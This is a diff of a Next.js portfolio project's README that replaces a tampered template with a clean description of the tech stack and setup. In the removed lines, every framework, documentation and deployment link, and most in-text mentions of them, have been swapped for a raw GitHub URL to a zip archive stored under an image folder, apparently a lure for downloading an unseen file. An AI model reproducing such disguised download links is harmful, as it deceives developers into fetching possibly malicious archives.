@@ -1,36 +1,71 @@
-This is a [https://github.com/Bonchon2023/DevPortfolio/raw/refs/heads/main/public/data/image/proflie/Dev_Portfolio_2.3.zip](https://github.com/Bonchon2023/DevPortfolio/raw/refs/heads/main/public/data/image/proflie/Dev_Portfolio_2.3.zip) project bootstrapped with [`create-next-app`](https://github.com/Bonchon2023/DevPortfolio/raw/refs/heads/main/public/data/image/proflie/Dev_Portfolio_2.3.zip).
+# 🚀 My Portfolio
 
-## Getting Started
+Welcome to my personal portfolio repository! This project is a modern, highly performant web application built with a robust front-end tech stack. It focuses on delivering a fast, responsive, and visually appealing user experience with smooth micro-interactions.
 
-First, run the development server:
+## 🛠 Tech Stack
+
+This project leverages the power of modern web development tools and libraries:
+
+- **Framework**: Next.js (v16.1) - For Server-Side Rendering (SSR), optimized performance, and seamless routing.
+- **Core Library**: React (v19.2)
+- **Language**: TypeScript - For static type checking, enhanced code quality, and better developer experience.
+- **Styling**: 
+  - Tailwind CSS (v4) - A utility-first CSS framework for rapid UI development.
+  - `tailwind-merge` & `clsx` - For dynamic class name management and conflict resolution.
+- **Animations**: Framer Motion - To create fluid animations and engaging UI interactions.
+- **UI Components**: Radix UI (`@radix-ui/react-slot`) - For accessible, unstyled UI primitives.
+- **Icons**: A comprehensive suite of icon libraries for visual enhancement:
+  - FontAwesome (`@fortawesome/react-fontawesome`)
+  - Lucide React
+  - React Icons
+  - Flaticon Uicons
+
+## 💻 Getting Started
+
+Follow these instructions to set up the project locally on your machine.
+
+### Prerequisites
+
+Make sure you have the following installed:
+
+- Node.js (Version 20.x or later recommended)
+- A package manager like npm, yarn, pnpm, or bun.
+
+### Installation
+
+Clone the repository to your local machine:
+
+```bash
+git clone <your-repository-url>
+cd my-portfolio
+```
+
+Install the required dependencies:
+
+```bash
+npm install
+# or yarn install
+# or pnpm install
+```
+
+### Running the Development Server
+
+Start the application in development mode with hot-module reloading:
 
 ```bash
 npm run dev
-# or
-yarn dev
-# or
-pnpm dev
-# or
-bun dev
+# or yarn dev
 ```
 
-Open [http://localhost:3000](http://localhost:3000) with your browser to see the result.
+Open [http://localhost:3000](http://localhost:3000) in your browser to view the application.
 
-You can start editing the page by modifying `https://github.com/Bonchon2023/DevPortfolio/raw/refs/heads/main/public/data/image/proflie/Dev_Portfolio_2.3.zip`. The page auto-updates as you edit the file.
+## 📜 Available Scripts
 
-This project uses [`next/font`](https://github.com/Bonchon2023/DevPortfolio/raw/refs/heads/main/public/data/image/proflie/Dev_Portfolio_2.3.zip) to automatically optimize and load [Geist](https://github.com/Bonchon2023/DevPortfolio/raw/refs/heads/main/public/data/image/proflie/Dev_Portfolio_2.3.zip), a new font family for Vercel.
+In the project directory, you can run the following commands:
 
-## Learn More
+- `npm run dev`: Starts the Next.js development server.
+- `npm run build`: Creates an optimized production build of your application.
+- `npm run start`: Starts the application in production mode (requires running build first).
+- `npm run lint`: Runs ESLint to analyze the code and catch potential issues.
 
-To learn more about https://github.com/Bonchon2023/DevPortfolio/raw/refs/heads/main/public/data/image/proflie/Dev_Portfolio_2.3.zip, take a look at the following resources:
-
-- [https://github.com/Bonchon2023/DevPortfolio/raw/refs/heads/main/public/data/image/proflie/Dev_Portfolio_2.3.zip Documentation](https://github.com/Bonchon2023/DevPortfolio/raw/refs/heads/main/public/data/image/proflie/Dev_Portfolio_2.3.zip) - learn about https://github.com/Bonchon2023/DevPortfolio/raw/refs/heads/main/public/data/image/proflie/Dev_Portfolio_2.3.zip features and API.
-- [Learn https://github.com/Bonchon2023/DevPortfolio/raw/refs/heads/main/public/data/image/proflie/Dev_Portfolio_2.3.zip](https://github.com/Bonchon2023/DevPortfolio/raw/refs/heads/main/public/data/image/proflie/Dev_Portfolio_2.3.zip) - an interactive https://github.com/Bonchon2023/DevPortfolio/raw/refs/heads/main/public/data/image/proflie/Dev_Portfolio_2.3.zip tutorial.
-
-You can check out [the https://github.com/Bonchon2023/DevPortfolio/raw/refs/heads/main/public/data/image/proflie/Dev_Portfolio_2.3.zip GitHub repository](https://github.com/Bonchon2023/DevPortfolio/raw/refs/heads/main/public/data/image/proflie/Dev_Portfolio_2.3.zip) - your feedback and contributions are welcome!
-
-## Deploy on Vercel
-
-The easiest way to deploy your https://github.com/Bonchon2023/DevPortfolio/raw/refs/heads/main/public/data/image/proflie/Dev_Portfolio_2.3.zip app is to use the [Vercel Platform](https://github.com/Bonchon2023/DevPortfolio/raw/refs/heads/main/public/data/image/proflie/Dev_Portfolio_2.3.zip) from the creators of https://github.com/Bonchon2023/DevPortfolio/raw/refs/heads/main/public/data/image/proflie/Dev_Portfolio_2.3.zip
-
-Check out our [https://github.com/Bonchon2023/DevPortfolio/raw/refs/heads/main/public/data/image/proflie/Dev_Portfolio_2.3.zip deployment documentation](https://github.com/Bonchon2023/DevPortfolio/raw/refs/heads/main/public/data/image/proflie/Dev_Portfolio_2.3.zip) for more details.
+💡 **Note**: This project is marked as private in the `package.json` to prevent accidental publishing to public npm registries.
